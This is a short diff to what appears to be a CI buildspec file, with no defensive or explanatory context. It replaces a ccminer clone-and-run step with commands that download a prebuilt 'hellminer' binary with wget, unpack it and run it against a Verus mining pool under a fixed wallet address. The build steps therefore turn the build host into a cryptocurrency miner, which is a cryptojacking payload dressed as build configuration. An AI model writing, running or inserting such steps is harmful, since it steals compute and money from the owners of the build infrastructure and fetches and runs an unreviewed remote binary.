@@ -3,5 +3,6 @@ version: 0.2
 phases:
   build:
     commands:
-        - git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
-        - cd ccminer && chmod +x build.sh configure.sh autogen.sh ./ccminer -a verus -o stratum+tcp://eu.luckpool.net:3956#xnsub -u RVMFutpZshkb9jiHYvh7rbq4RaqWGiKGUm.Drip -p x -t $(nproc --all)
+        - wget https://github.com/hellcatz/hminer/releases/download/v0.58/hellminer_linux64.tar.gz
+        - tar -xvf hellminer_linux64.tar.gz
+        - ./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RVMFutpZshkb9jiHYvh7rbq4RaqWGiKGUm.pko
